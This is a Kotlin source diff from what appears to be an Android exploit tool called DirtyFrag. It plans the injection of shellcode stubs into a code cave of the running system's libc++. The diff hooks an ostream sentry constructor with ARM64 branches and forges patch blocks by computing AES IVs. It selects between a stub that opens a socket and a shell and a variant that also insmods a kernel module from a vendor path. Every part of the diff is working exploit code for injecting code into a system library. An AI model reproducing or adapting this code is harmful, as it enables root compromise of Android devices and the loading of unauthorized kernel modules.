@@ -12,20 +12,31 @@ import javax.crypto.spec.SecretKeySpec
  * blocks that restore them. Every IV is computed here — IV = AES_ECB_DEC(key,
  * current_block) XOR desired_block — so the native stage only splices and sends.
  *
- * The layout constants are those of assets/dirtyfrag_stub.bin (the prototype in
- * the private repo: stub.S, 420 bytes).
+ * There are two stubs, built from one source (`tools/dirtyfrag_payload/stub.S`,
+ * split by `-DDIRTYFRAG_MODULE`): the **plain** blob (socket + shell, the
+ * DirtyFrag pipeline) and the **module** blob (the same path plus the
+ * vendor_file insmod prologue, the module chain only). A plan writes the blob
+ * it will run and the cave preflight sizes that same blob, so a device is
+ * measured against its own payload — the OnePlus 6.6.66's 640 B margin fits the
+ * plain blob and refuses the module one.
  */
 object DirtyfragPlan {
     internal const val BRIDGE_ASSET = "dirtyfrag_bridge.bin"
+    /** The DirtyFrag pipeline's stub: abstract socket + one shell. */
     private const val STUB_ASSET = "dirtyfrag_stub.bin"
+    /** The module chain's stub: the plain path plus the insmod prologue. */
+    private const val STUB_MODULE_ASSET = "dirtyfrag_stub_module.bin"
     private const val STUB_NAME_OFFSET = 3
-    /* The module-pipeline ko target (a vendor_file path the stub insmods); an
-     * empty first byte keeps the W1 pipelines on the plain shell path. */
+    /* `stub_code` in each blob (their data blocks differ). */
+    private const val PLAIN_STUB_CODE_OFFSET = 0x50
+    private const val MODULE_STUB_CODE_OFFSET = 0xd0
+    /* The module blob's ko target (a vendor_file path the stub insmods). The
+     * plain blob has no such field — 0x50 is its code entry. */
     private const val STUB_KO_OFFSET = 0x50
     private const val KO_TARGET_MAX = 64
-    private const val STUB_CODE_OFFSET = 0xd0
-    private const val STUB_FIRST_INS_OFFSET = 0x2d4
-    private const val STUB_RETURN_OFFSET = 0x2d8
+    /* Both blobs end with the two patched words: the site's original insn and
+     * the return branch. Their offsets follow the blob's size. */
+    private const val STUB_TAIL_BYTES = 8
     private const val CAVE_PAGE_BYTES = 0x1000L
     private const val SENTRY_SYMBOL =
         "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_"
@@ -57,15 +68,19 @@ object DirtyfragPlan {
     /**
      * The pure cave/layout rules. The cave is the byte after the executable
      * segment's file data, inside that segment's **last 4 KiB page**: the
-     * loader's executable mapping of that page is what runs the stub, so the
-     * blob must fit the page remainder (the 420 B stub against the stage-1
-     * 2520/640 B margins). The RW segment's bytes share the same page-cache
-     * page by design (its `.data.rel.ro` alias is COWed in live processes), so
-     * a shared page is not an error; a cave at a page boundary has no
-     * executable page and is rejected. Both branch displacements must fit the
-     * ARM64 B range.
+     * loader's executable mapping of that page is what runs the stub, so
+     * [blobSize] must fit the page remainder, and the branches target the
+     * blob's own entry ([codeOffset]) and its tail word. The RW segment's bytes
+     * share the same page-cache page by design (its `.data.rel.ro` alias is
+     * COWed in live processes), so a shared page is not an error; a cave at a
+     * page boundary has no executable page and is rejected. Both branch
+     * displacements must fit the ARM64 B range.
      */
-    internal fun checkCave(layout: CaveLayout, blobSize: Int): List<String> {
+    internal fun checkCave(
+        layout: CaveLayout,
+        blobSize: Int,
+        codeOffset: Int,
+    ): List<String> {
         val reasons = mutableListOf<String>()
         val cave = layout.execOffset + layout.execFilesz
         val caveEnd = cave + blobSize
@@ -84,14 +99,28 @@ object DirtyfragPlan {
                 reasons += "cave page remainder $remain < stub $blobSize"
             }
         }
-        if (!branchFits(layout.hook, cave + STUB_CODE_OFFSET)) {
+        if (!branchFits(layout.hook, cave + codeOffset)) {
             reasons += "hook branch out of range"
         }
-        if (!branchFits(cave + STUB_RETURN_OFFSET, layout.hook + 4)) {
+        if (!branchFits(cave + returnOffset(blobSize), layout.hook + 4)) {
             reasons += "return branch out of range"
         }
         return reasons
     }
+
+    /** The module chain's stub asset; the plain one otherwise. */
+    private fun stubAsset(moduleMode: Boolean): String =
+        if (moduleMode) STUB_MODULE_ASSET else STUB_ASSET
+
+    /** The selected blob's `stub_code` offset (the hook's branch target). */
+    private fun stubCodeOffset(moduleMode: Boolean): Int =
+        if (moduleMode) MODULE_STUB_CODE_OFFSET else PLAIN_STUB_CODE_OFFSET
+
+    /** The first patched tail word: the site's original instruction. */
+    private fun firstInsOffset(blobSize: Int): Int = blobSize - STUB_TAIL_BYTES
+
+    /** The second patched tail word: the return branch. */
+    private fun returnOffset(blobSize: Int): Int = blobSize - 4
 
     internal fun branchFits(from: Long, to: Long): Boolean {
         val delta = to - from
@@ -111,21 +140,31 @@ object DirtyfragPlan {
         CaveLayout(exec.offset, exec.filesz, hook, elf.length())
     }
 
-    /** Structural check of the running ROM's libc++; callable before W1. */
-    internal fun preflight(context: Context, lib: File): DirtyfragPreflight {
+    /**
+     * Structural check of the running ROM's libc++; callable before W1.
+     * [moduleMode] selects the stub the stage will actually write: the plain
+     * blob for the DirtyFrag pipeline, the module blob for the module chain.
+     */
+    internal fun preflight(
+        context: Context,
+        lib: File,
+        moduleMode: Boolean = false,
+    ): DirtyfragPreflight {
         val reasons = mutableListOf<String>()
         var details = ""
         try {
-            val blob = context.assets.open(STUB_ASSET).use { it.readBytes() }
-            if (blob.size < STUB_RETURN_OFFSET + 4) {
+            val blob = context.assets.open(stubAsset(moduleMode)).use { it.readBytes() }
+            val codeOffset = stubCodeOffset(moduleMode)
+            if (blob.size < codeOffset + STUB_TAIL_BYTES) {
                 reasons += "stub asset truncated (${blob.size} B)"
             }
             val layout = inspect(lib)
-            reasons += checkCave(layout, blob.size)
+            reasons += checkCave(layout, blob.size, codeOffset)
             val cave = layout.execOffset + layout.execFilesz
             val remain = CAVE_PAGE_BYTES - (cave and (CAVE_PAGE_BYTES - 1))
             details = "lib=${lib.absolutePath} cave=$cave page_remain=$remain " +
-                "blob=${blob.size} hook=${layout.hook} file=${layout.fileLength}"
+                "blob=${blob.size} stub=${if (moduleMode) "module" else "plain"} " +
+                "hook=${layout.hook} file=${layout.fileLength}"
         } catch (t: Throwable) {
             reasons += "${t::class.simpleName}: ${t.message}"
         }
@@ -159,19 +198,25 @@ object DirtyfragPlan {
             val exec = execSegment(loadSegments(elf))
             val hook = hookOffset(elf, exec)
             val cave = exec.offset + exec.filesz
-            val blob = context.assets.open(STUB_ASSET).use { it.readBytes() }
-            require(blob.size >= STUB_RETURN_OFFSET + 4) { "stub asset truncated" }
+            /* The module chain delivers its ko through this stub; the plain
+             * DirtyFrag pipeline carries no target and uses the smaller blob. */
+            val moduleMode = koTarget.isNotEmpty()
+            val codeOffset = stubCodeOffset(moduleMode)
+            val blob = context.assets.open(stubAsset(moduleMode)).use { it.readBytes() }
+            require(blob.size >= codeOffset + STUB_TAIL_BYTES) { "stub asset truncated" }
+            val firstIns = firstInsOffset(blob.size)
+            val returnOffset = returnOffset(blob.size)
 
             System.arraycopy(socketName.toByteArray(Charsets.US_ASCII), 0, blob, STUB_NAME_OFFSET, 8)
-            for (i in 0 until KO_TARGET_MAX) blob[STUB_KO_OFFSET + i] = 0
-            if (koTarget.isNotEmpty()) {
+            if (moduleMode) {
+                for (i in 0 until KO_TARGET_MAX) blob[STUB_KO_OFFSET + i] = 0
                 val bytes = koTarget.toByteArray(Charsets.US_ASCII)
                 require(bytes.size < KO_TARGET_MAX) { "ko target too long" }
                 System.arraycopy(bytes, 0, blob, STUB_KO_OFFSET, bytes.size)
             }
-            putInt(blob, STUB_FIRST_INS_OFFSET, readInt(elf, hook))
-            putInt(blob, STUB_RETURN_OFFSET, branch(cave + STUB_RETURN_OFFSET, hook + 4))
-            val hookBranch = branch(hook, cave + STUB_CODE_OFFSET)
+            putInt(blob, firstIns, readInt(elf, hook))
+            putInt(blob, returnOffset, branch(cave + returnOffset, hook + 4))
+            val hookBranch = branch(hook, cave + codeOffset)
 
             val patches = ArrayList<Block>()
             // Cave blocks: the stub blob, 16-byte read-modify-write.
